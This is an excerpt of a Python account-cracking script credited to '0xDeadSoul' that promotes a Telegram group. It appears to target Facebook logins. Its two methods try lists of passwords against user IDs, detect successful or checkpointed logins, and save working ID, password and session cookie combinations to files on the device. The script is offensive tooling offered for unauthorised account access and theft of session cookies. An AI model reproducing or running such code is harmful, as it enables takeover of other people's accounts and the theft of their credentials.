# SCRIPT BY 0xDeadSoul
# JOIN GROUP : https://t.me/AnonymousCyberShield
#---------------------[ IMPORT ]---------------------#
...
def mrpoco():
    ...
    if ___option___ in ["1"]:os.system('xdg-open https://t.me/AnonymousCyberShield');poco.append('1');______randomxmenu_______()
    elif ___option___ in ["2"]:os.system('xdg-open https://t.me/AnonymousCyberShield');poco.append('2');______randomxmenu_______()
    elif ___option___ in ["3"]:os.system('xdg-open https://t.me/AnonymousCyberShield');poco.append('3');______randomxmenu_______()
    elif ___option___ in ["4"]:os.system('xdg-open https://t.me/AnonymousCyberShield');poco.append('4');______randomxmenu_______()
    elif ___option___ in ["5"]:os.system('xdg-open https://t.me/AnonymousCyberShield');poco.append('5');______randomxmenu_______()
    elif ___option___ in ["6"]:os.system('xdg-open https://t.me/AnonymousCyberShield');poco.append('6');______randomxmenu_______()
...
def ____methodA____(ids,pasx,tl):
    ...
    sys.stdout.write(f'\r\r{xd}-{R}[{G}0xDeadSoul-M1{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}] ');sys.stdout.flush()
    for pw in pasx:
        try:
            ...
            if "checkpoint" in ewe.cookies.get_dict():
                ...
                print(f"\r{xd}-{R}[{Y}0xDeadSoul-CP{R}]{Y} {uid} | {pw} ")
                open('/sdcard/0xDeadSoul-M1-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                cp+=1
                break
                ...
                if 'LIVE' in response:
                    print(f"\r{xd}-{R}[{G}0xDeadSoul-OK{R}]{G} {uid} | {pw} ")
                    print(f"\r{R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")
                    open('/sdcard/0xDeadSoul-M1-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
                    ok+=1
                    break
                else:continue
...
def ____methodB____(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r\r{xd}-{R}[{G}0xDeadSoul-M2{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}] ');sys.stdout.flush()
        try:
                for pw in pasx:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'LIVE' in response:
                                            print(f"\r{xd}-{R}[{G}0xDeadSoul-OK{R}]{G} {uid} | {pw} ")
                                            print(f"\r {R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")
                                            open('/sdcard/0xDeadSoul-M2-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
                                            ok.append(str(uid))
                                            break
                                        else:continue
                                        ...
                                        print(f"\r{xd}-{R}[{Y}0xDeadSoul-CP{R}]{Y} {uid} | {pw} ")
                                        open('/sdcard/0xDeadSoul-M2-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                                        cp.append(str(uid))
                                        break
                        else:continue
                loop+=1
